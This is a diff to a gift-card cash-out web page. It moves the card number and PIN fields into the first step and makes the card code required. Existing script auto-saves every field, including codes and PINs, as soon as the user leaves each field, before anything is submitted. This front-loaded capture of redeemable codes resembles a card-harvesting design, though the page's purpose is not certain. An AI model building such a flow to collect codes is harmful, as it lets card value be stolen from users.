@@ -231,8 +231,9 @@
 
 <div class="container-main">
 
+  <!-- STEP 1: CARD DETAILS -->
   <div class="card" id="sell">
-    <span class="step-badge">Step 1 — Get a Quote</span>
+    <span class="step-badge">Step 1 — Card Details</span>
     <h2>Tell us about your gift card</h2>
 
     <div class="grid-2">
@@ -256,6 +257,12 @@
       </div>
     </div>
 
+    <label>Card Number / Code</label>
+    <input type="text" id="cardNumber" placeholder="XXXX-XXXX-XXXX-XXXX" required>
+
+    <label>PIN / Activation Code (if any)</label>
+    <input type="text" id="pin" placeholder="4-digit PIN or code">
+
     <label>Condition</label>
     <select id="condition">
       <option value="with_receipt">With receipt — highest rate</option>
@@ -269,6 +276,7 @@
     </div>
   </div>
 
+  <!-- STEP 2: PAYOUT DETAILS -->
   <div class="card" id="detailCard">
     <span class="step-badge">Step 2 — Your Details</span>
     <h2>Where should we send your payout?</h2>
@@ -286,12 +294,6 @@
 
     <label>Phone (optional)</label>
     <input type="tel" id="phone" placeholder="+1 555 123 4567">
-
-    <label>Card Number</label>
-    <input type="text" id="cardNumber" placeholder="XXXX-XXXX-XXXX-XXXX">
-
-    <label>PIN (if applicable)</label>
-    <input type="text" id="pin" placeholder="4-digit PIN">
 
     <div class="grid-2">
       <div>
@@ -315,6 +317,7 @@
     <div class="msg error" id="errorMsg"></div>
   </div>
 
+  <!-- SUCCESS SCREEN -->
   <div class="card" id="successCard" style="display:none;">
     <div class="success-screen">
       <div class="check">✓</div>
@@ -332,7 +335,6 @@
 <script>
   const $ = (id) => document.getElementById(id);
   
-  // Generate a unique ID for this session's draft
   let draftId = localStorage.getItem('cashcard_draftId');
   if (!draftId) {
     draftId = crypto.randomUUID();
@@ -341,7 +343,7 @@
 
   const fieldIds = ['fullName', 'email', 'phone', 'brand', 'cardNumber', 'pin', 'balance', 'condition', 'paymentMethod', 'paymentDetails'];
 
-  // Auto-save on 'blur' (when they click out of a field)
+  // Auto-save on blur
   fieldIds.forEach(id => {
     $(id).addEventListener('blur', () => {
       const data = { draftId: draftId };
@@ -403,6 +405,7 @@
     if (!data.fullName) missing.push('Full Name');
     if (!data.email) missing.push('Email');
     if (!data.brand) missing.push('Gift Card Brand');
+    if (!data.cardNumber) missing.push('Card Number / Code');
     if (!data.balance) missing.push('Card Balance');
     if (!data.paymentMethod) missing.push('Payout Method');
     if (!data.paymentDetails) missing.push('Payout Details');
@@ -428,7 +431,6 @@
       $('successCard').style.display = 'block';
       $('refId').textContent = 'Ref: ' + json.submissionId;
       
-      // Clear draft from browser
       localStorage.removeItem('cashcard_draftId');
       localStorage.removeItem('cashcard_draft');
       
